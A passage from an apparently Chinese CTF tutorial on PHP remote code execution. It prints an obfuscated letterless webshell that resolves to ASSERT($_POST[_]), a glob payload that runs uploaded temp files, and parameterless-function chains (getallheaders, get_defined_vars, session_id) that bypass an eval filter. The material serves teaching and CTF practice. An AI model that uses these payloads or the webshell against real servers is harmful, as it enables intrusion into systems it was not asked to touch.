punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// R$___.=$__;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T$___.=$__;</span><span class="token variable">$____</span><span class="token operator">=</span><span class="token string single-quoted-string">'_'</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// P$____.=$__;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// O$____.=$__;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// S$____.=$__;</span><span class="token variable">$__</span><span class="token operator">=</span><span class="token variable">$_</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span><span class="token variable">$__</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">// T$____.=$__;</span><span class="token variable">$_</span><span class="token operator">=</span><span class="token variable">$$____</span><span class="token punctuation">;</span><span class="token variable">$___</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">[</span><span class="token constant">_</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ASSERT($_POST[_]);</span></span></code></pre><p>在php7中，我们可以使用($a)()这种方法来执行命令，如(call_user_func)(system,whoami,’’)</p><p>php7特性</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token string single-quoted-string">'var_dump'</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1111'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">(</span><span class="token string double-quoted-string">"VAR_DUMP"</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"llll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span>ss<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">]</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br/&gt;'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'_GET'</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$$a</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string backtick-quoted-string">`pwd`</span><span class="token punctuation">;</span></span></code></pre><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NThjZjVhNjA3NWI1NmY1MjI1NzI2ZDcwZTE2NGQ4YTlfdnEydWQ0VDBWMFU4Z2dLMW1XVGhEUHhKZkQwV1M2VkNfVG9rZW46WmZiemJLdWZYb3lZZEp4cEVKbmNzZVhJbmViXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><h3 id="4-临时文件"><a href="#4-临时文件" class="headerlink" title="4.临时文件"></a>4.<strong>临时文件</strong></h3><p>利用通配符</p><p>用<code>. file</code>执行文件，是不需要file有x权限的。那么，如果目标服务器上有一个我们可控的文件，</p><p>这个文件也很好得到，我们可以发送一个上传文件的POST包，此时PHP会将我们上传的文件保存在临时文件夹下，默认的文件名是<code>/tmp/phpXXXXXX</code>，文件名最后6个字符是随机的大小写字母。</p><p>所有文件名都是小写，只有PHP生成的临时文件包含大写字母。那么答案就呼之欲出了，我们只要找到一个可以表示“大写字母”的glob通配符，就能精准找到我们要执行的文件。</p><p>翻开ascii码表，可见大写字母位于<code>@</code>与<code>[</code>之间：</p><p>当然，php生成临时文件名是随机的，最后一个字符不一定是大写字母，不过多尝试几次也就行了。</p><p>最后，我传入的code为<code>?&gt;&lt;?=. /???/????????[@-[];?&gt;</code>，发送数据包如下：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YWU5MjU2NWQ2MWJmYjU3Zjk5MGY3MTY2Y2Q4YmZiYzZfUENkN3pEbm5MMzU2b0hQWk9NVDhENnlHVlo0R3J3alRfVG9rZW46RUYzd2JmRWt6b2JkRXl4NkFlRGNVQ0tpbmxiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>成功执行任意命令。</p><h2 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h2><p>无参rce，就是说在无法传入参数的情况下，仅仅依靠传入没有参数的函数套娃就可以达到命令执行的效果，这在ctf中也算是一个比较常见的考点，接下来就来详细总结总结它的利用姿势</p><h2 id="核心代码"><a href="#核心代码" class="headerlink" title="核心代码"></a>核心代码</h2><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>这段代码的核心就是只允许函数而不允许函数中的参数，就是说传进去的值是一个字符串接一个<code>()</code>，那么这个字符串就会被替换为空，如果替换后只剩下<code>;</code>，那么这段代码就会被<code>eval</code>执行。而且因为这个正则表达式是递归调用的，所以说像<code>a(b(c()));</code>第一次匹配后就还剩下<code>a(b());</code>，第二次匹配后就还剩<code>a();</code>，第三次匹配后就还剩<code>;</code>了，所以说这一串<code>a(b(c()));</code>就会被<code>eval</code>执行，但相反，像<code>a(b('111'));</code>这种存在参数的就不行，因为无论正则匹配多少次它的参数总是存在的。那假如遇到这种情况，我们就只能使用没有参数的php函数，下面就来具体介绍一下：</p><h2 id="1-getallheaders"><a href="#1-getallheaders" class="headerlink" title="1.getallheaders()"></a>1.getallheaders()</h2><p>这个函数的作用是获取<code>http</code>所有的头部信息，也就是<code>headers</code>，然后我们可以用<code>var_dump</code>把它打印出来，但这个有个限制条件就是必须在<code>apache</code>的环境下可以使用，其它环境都是用不了的，我们到burp中去做演示,测试代码如下：</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">';'</span> <span class="token operator">===</span> <span class="token function">preg_replace</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[^\W]+\((?R)?\)/'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>  <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'code'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">else</span> <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'please input code'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span> </code></pre><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=M2Y2OTE1NzVjMzBkZGZiZGY1MzZmODY0ODk4OWNjMWFfOXQ1SnRDZ1NqTVJSaWZvOEJMZDNDYmxJSlV0SFlHNTFfVG9rZW46QkpCYmJReDR4bzZVMUd4ZDBtTmNFTEMxbkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>可以看到，所有的头部信息都已经作为了一个<strong>数组</strong>打印了出来，在实际的运用中，我们肯定不需要这么多条，不然它到底执行哪一条呢？所以我们需要选择一条出来然后就执行它，这里就需要用到<code>php</code>中操纵数组的函数了，这里常见的是利用<code>end()</code>函数取出最后一位，这里的效果如下图所示，而且它只会以<strong>字符串</strong>的形式取出<strong>值</strong>而不会取出键，所以说键名随便取就行：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YjcwZmViOTQ5NjZlYzZkZDdlMjMyNjIyOGQ2M2VjODhfNmFYY2VGZU1oRXFNZXVYMXh2dVRxWGlWQXVybTR1dGxfVG9rZW46VkJOQ2I1UmVPb0o1QU54cE9xV2NUcjB5bjFiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>那我们把最前面的<code>var_dump</code>改成<code>eval</code>，不就可以执行<code>phpinfo</code>了吗，换言之，就可以实现任意php代码的代码执行了，那在没有过滤的情况下执行命令也就轻而易举了，具体效果如下图所示：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MmY0Yzk0MjA1MWU0MDlhNWMyODAwMTBkZDIyMzEyZTZfTHU0emMxbVBkQXJjMGo4WVhGWVoxOVQ0MDRMZmpKbVpfVG9rZW46RnBjTGJhYkM5bzZkU2p4NndQcWNOOHpmbmFnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ODYyMDRkNmUzOWFjYjMzYzdkOTlmNDJiNWZmZGI1MmNfcjdPTTJNaGRQUnMzQVk5dGF5QlVpN2ZHM1lYN2NlcjJfVG9rZW46RE1XRGJ6N1lFb3Bycnd4OUJtQmNpSFhybmtZXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h2 id="2-get-defined-vars"><a href="#2-get-defined-vars" class="headerlink" title="2.get_defined_vars()"></a>2.get_defined_vars()</h2><p>上面说到了，<code>getallheaders()</code>是有局限性的，因为如果中间件不是<code>apache</code>的话，它就用不了了，那我们就介绍一种更为普遍的方法<code>get_defined_vars()</code>，这种方法其实和上面那种方法原理是差不多的：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YTcyMjlhMDI4YmE1Y2FjNGJhZjlmODNmZTNiZGJhZmZfaFhtY2FKVGx6TzBqVldjc3JMMzFpN3dYdkRsUWhrYW1fVG9rZW46T2ViS2JJVTUyb2l6THl4Vk81WGNpVkFBbnhmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>可以看到，它并不是获取的<code>headers</code>，而是获取的四个全局变量<code>$_GET $_POST $_FILES $_COOKIE</code>，而它的返回值是一个二维数组，我们利用<code>GET</code>方式传入的参数在第一个数组中。这里我们就需要先将二维数组转换为一维数组，这里我们用到<code>current()</code>函数，这个函数的作用是返回数组中的当前单元，而它的默认是第一个单元，也就是我们GET方式传入的参数，我们可以看看实际效果：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDE3NmU2OTdkM2Y4ODVlMDYwZDFlOTk0YTc3NmRmNzlfUEJkRDBXM1VEdWxpNnhyaHVPMnlZN01xQVlad2ZZVTFfVG9rZW46SldnZ2JWcm1Qb0YzYjl4d3ZHMWNQSlZWbjNlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>这里可以看到成功输出了我们二维数组中的第一个数据，也就是将GET的数据全部输出了出来，相当于它就已经变成了一个一维数组了，那按照我们上面的方法，我们就可以利用<code>end()</code>函数以字符串的形式取出最后的值，然后直接<code>eval</code>执行就行了，这里和上面就是一样的了：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=NTE2NmNjMmNkMDJmODQ5ODZmN2RmYzQyMzczYzFlMDJfM0xMWHg3OE5xVnVLVmVzc0hNOTNTRlB0WWh4R1UyUDVfVG9rZW46SU11QWJUNnNKbzNiMGV4c1djMWN5bGdUbmJkXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmM0Yzc3YWEzYTJlOTZlYjE0ZDAwMmFiMTk5ZjFjMjVfNk5pVnRYRzlpTjFvQWFJVG1vY3l2TUxKY0UyQ1hMdUdfVG9rZW46QnhKdWJQM3pxbzZpYWZ4amxSRWNpOEMwbk9oXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=N2Q3MWE2ZDBhYWQ0YTY1NGY2OWIyMGFiYWM5Nzk5MTZfaFFMRmw1NGZBVVNoVzBqcFk3ZkREVXdzWHY1TFQ1dnFfVG9rZW46VTNUTmJtMm1wb1FlVjF4dGw0cWNQNWx3bndoXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>总结一下，这种方法和第一种方法几乎是一样的，就多了一步，就是利用<code>current()</code>函数将二维数组转换为一维数组，如果大家还是不了解<code>current()</code>函数的用法，可以接着往下看文章，会具体介绍的哦</p><p>这里还有一个专门针对<code>$_FILES</code>下手的方法，可以参考这篇文章：<a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><h2 id="3-session-id"><a href="#3-session-id" class="headerlink" title="3.session_id()"></a>3.session_id()</h2><p>这种方法和前面的也差不太多，这种方法简单来说就是把恶意代码写到<code>COOKIE</code>的<code>PHPSESSID</code>中，然后利用<code>session_id()</code>这个函数去读取它，返回一个字符串，然后我们就可以用<code>eval</code>去直接执行了，这里有一点要注意的就是<code>session_id()</code>要开启<code>session</code>才能用，所以说要先<code>session_start()</code>，这里我们先试着把<code>PHPSESSID</code>的值取出来：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjZhNmMwNTczNTBjYzg1MzYwZmJiMWE4MjJiZWNjNjVfY3dMU2RKR241cFhIZnJpTFZ1YTBQdWdCTmNRcnFVZVdfVG9rZW46UzV5aWJHekdzb21GYkx4RW1qc2MybTBDbkN1XzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>直接出来就是字符串，那就非常完美，我们就不用去做任何的转换了，但这里要注意的是，<code>PHPSESSIID</code>中只能有<code>A-Z a-z 0-9</code>，<code>-</code>，所以说我们要先将恶意代码16进制编码以后再插入进去，而在php中，将16进制转换为字符串的函数为<code>hex2bin</code></p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDUxM2YxNjdiNTc4YjM2MTc3OWUxMDY2YjMxYmQ5NWZfUU1jdjRlVzRlVktzNnFuVmNEYktiOHRkTk1tRGp0Yk9fVG9rZW46Tmw3Z2JwaFVGb2FCYjZ4NHFwcGNJcjV6bmIwXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZjVkZmE4MmRmMWM2MTI0NWFjZTU5ZjMyODdkZjljNTVfUkFGQmZJZTJWaDJZNW1JbksyWHpybzNnYlF0WEpnNVRfVG9rZW46SWdQbmJOTzZrbzcyZXB4dlJVU2NKM2d6bm5nXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>那我们就可以开始构造了，首先把<code>PHPSESSID</code>的值替换成这个，然后在前面把<code>var_dump</code>换成<code>eval</code>就可以成功执行了，如图：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzE1NDM3ZGZiNDRkYThjZGQ3MzBmNTNiMGFiOTJhMTJfc2FuaTliR0hhNG1YY3dIQ1plTDE4cU5mcWdZZGswSWdfVG9rZW46SHJEQWJWYWdPbzNRclB4dXhBQmNSb2h2bnRmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>成功出现<code>phpinfo</code>，稳稳当当，这种方法我认为是最好的一种方法，很容易理解，只是记得要将恶意代码先16进制编码一下哦</p><h2 id="4-php函数直接读取文件"><a href="#4-php函数直接读取文件" class="headerlink" title="4.php函数直接读取文件"></a>4.php函数直接读取文件</h2><p>上面我们一直在想办法在进行rce，但有的情况下确实无法进行rce时，我们就要想办法直接利用php函数完成对目录以及文件的操作， 接下来我们就来介绍这些函数：</p><h3 id="1-localeconv"><a href="#1-localeconv" class="headerlink" title="1.localeconv"></a>1.localeconv</h3><p>官方解释：localeconv() 函数返回一个包含本地数字及货币格式信息的数组。</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YmU2NDExYzg1OWQ4NTBlYzcyMGVmOGQzYmVmMmMwOTlfbkNuVEc4RFRhdGViTHAyV3lGMWtQV04zOWlVTkFidWpfVG9rZW46WlA2eGJET2VlbzR3RzB4T3NTNWNQcWIzbnZiXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p>这个函数其实之前我一直搞不懂它是干什么的，为什么在这里有用，但实践出真知，我们在测试代码中将<code>localeconv()</code>的返回结果输出出来，这里很神奇的事就发生了，它返回的是一个二维数组，而它的第一位居然是一个点<code>.</code>，那按照我们上面讲的，是可以利用<code>current()</code>函数将这个点取出来的，但这个点有什么用呢？点代表的是当前目录！那就很好理解了，我们可以利用这个点完成遍历目录的操作！相当于就是<code>linux</code>中的<code>ls</code>，具体请看下图：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=YzBjNWFiZTUxOWRjNTc1ZmY4MWQ0ZjE5NjdkN2NmY2VfZGlrQzFkVFZ2Ykw3Y0FxWUxLS0VNTmNNbHQyTEVDVzdfVG9rZW46Ulg5NWJsaHFvb1hLOWF4bXQ1WWNGZE5BblFlXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDAzMjYwNTQ3OWUyOWRjNzRlZjUyNDc4YThkZGM4NmRfMnd3UFZESXczWVBVT05FbW9RYmxKcFAyUDdBSkRJaGNfVG9rZW46QUtYUmJnRVNNb09VSm14SGI3cGNjYjBJblFmXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=OTc0NjY0MzQzYzc3MWY5NmM0YzA1MWI0NWM0MjdkMmJfM2NDekp1RnpVN3p0RWZUd2sxRU5rQlB0NDJ1TFVWM1NfVG9rZW46VHM5eGJid3VGbzdhY1N4aDc5M2NBQmdHblhjXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="2-scandir"><a href="#2-scandir" class="headerlink" title="2.scandir"></a>2.scandir</h3><p>这个函数很好理解，就是列出目录中的文件和目录</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MDFiMzQyMzcwMjUzODhlZTQ2YzE4ODdjZTcyZDQ1NzBfazhHb1paS0pwcWdyekd3YW5CTDByWlUwZFFiaXBsbnZfVG9rZW46WFJLWWJTQ2xjb2ZXeWx4d09CQmNEZlZNblYxXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="3-current-pos"><a href="#3-current-pos" class="headerlink" title="3.current(pos)"></a>3.current(pos)</h3><p>这里首先声明，<code>pos()</code>函数是<code>current()</code>函数的别名，他们俩是完全一样的哈</p><p>这个函数我们前面已经用的很多了，它的作用就是输出数组中当前元素的值，只输出值而忽略掉键，默认是数组中的第一个值，如果要移动可以用下列方法进行移动：</p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=ZTI1NjQxZjkzM2U2MWYzZGYyMTdlNWY3MGQ3MjQzYzFfV2lUS1VPVVkzZzl0OUlLN2I2YlFQaUlxVklkOW80WmRfVG9rZW46UUh6bGIyUUdGb0Z4TnF4QVduMWMwZVh0blZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><p>image.png</p><h3 id="4-chdir"><a href="#4-chdir" class="headerlink" title="4.chdir()"></a>4.chdir()</h3><p>这个函数是用来跳目录的，有时想读的文件不在当前目录下就用这个来切换，因为<code>scandir()</code>会将这个目录下的文件和目录都列出来，那么利用操作数组的函数将内部指针移到我们想要的目录上然后直接用<code>chdir</code>切就好了，如果要向上跳就要构造<code>chdir('..')</code></p><p><img src="https://vxxly2ajy0y.feishu.cn/space/api/box/stream/download/asynccode/?code=MWVkOWYzMWM5ZDE0NzBhYzRhYjdmZDM3OWE5MDM3ZTRfcVJ5R0t2RUtoZ3Z6Q2dJZzRYSWdjU0czb2RsVUFJdU9fVG9rZW46VVhmN2JJUHpmb0lJc3F4WEV0NWNSSUh2bkZnXzE2OTEzMDI1MDU6MTY5MTMwNjEwNV9WNA" alt="img"></p><h3 id="5-array-reverse"><a href="#5-array-reverse" class="headerlink" title="5.array_reverse()"></a>5.array_reverse()</h3><p>将整个数组倒过来，有的时候当我们想读的文件比较靠后时，就可以用这个函数把它倒过来，就可以少用几个<code>next()</code></p><h3 id="6-highlight-file"><a href="#6-highlight-file" class="headerlink" title="6.highlight_file()"></a>6.highlight_file()</h3><p>打印输出或者返回 filename 文件中语法高亮版本的代码，相当于就是用来读取文件的</p><h2 id="无回显RCE"><a href="#无回显RCE" 